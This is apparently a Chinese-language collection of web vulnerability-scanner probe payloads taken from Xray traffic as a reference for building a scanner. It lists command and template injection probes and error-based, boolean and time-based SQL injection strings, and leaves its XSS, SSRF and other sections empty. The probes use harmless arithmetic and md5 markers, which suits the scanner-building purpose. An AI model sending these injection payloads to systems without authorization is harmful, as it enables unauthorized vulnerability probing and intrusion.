# WEB 漏扫 payload 收集

从热门扫描器的请求流量中收集漏洞探测 payload ，作为自研漏洞扫描参考
漏洞检测基本原则：
- 随机性
- 兼容性
- 确定性
- 稳定性

## Xray 篇

### 命令/代码注入
```
form=submit\nexpr 967956968 + 870986373
form=submit|expr 975557975 + 826881873 
form=submit$(expr 862697460 + 985788997)
form=submit&set /A 826928544+894328131
form=${@var_dump(md5(479761091))};
form='-var_dump(md5(610751663))-'
form=/*1*/{{896160391+947073433}}
form=${868268572+852296119}
form=${(885971328+918689280)?c}
form=#set($c=816805615+870887710)${c}$c
form=<%- 980656021+824491715 %>
```

### SQL 注入

#### 回显

```
form=submit'and/**/extractvalue(1,concat(char(126),md5(1801244667)))and'
form=submit"and/**/extractvalue(1,concat(char(126),md5(1262626756)))and"
target=extractvalue(1,concat(char(126),md5(1139440625)))
```

#### 盲注

```
form=submit'and(select'1'from/**/cast(md5(1776912497)as/**/int))>'0
form=submit/**/and/**/cast(md5('1500755628')as/**/int)>0
target=convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','1321453846')))
form=submit'and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','1497551299')))>'0
form=submit鎈'"\(
form=submit'"\(
form=submit'and'm'='m
form=submit'and'p'='f
form=submit"and"c"="c
form=submit"and"c"="g

form=submit'and(select*from(select+sleep(0))a/**/union/**/select+1)='
form=submit'and(select*from(select+sleep(2))a/**/union/**/select+1)='
form=submit"and(select*from(select+sleep(0))a/**/union/**/select+1)="
form=submit"and(select*from(select+sleep(2))a/**/union/**/select+1)="
form=submit'/**/and(select'1'from/**/pg_sleep(0))>'0
form=submit'/**/and(select'1'from/**/pg_sleep(2))>'0
form=submit'and(select+1)>0waitfor/**/delay'0:0:0
form=submit'and(select+1)>0waitfor/**/delay'0:0:2
form=submit'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('k',0)='k
form=submit'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('k',2)='k
```

### XSS

### 任意跳转检测

### 路径穿越检测

### XML 注入

### SSRF 

## AWVS 篇
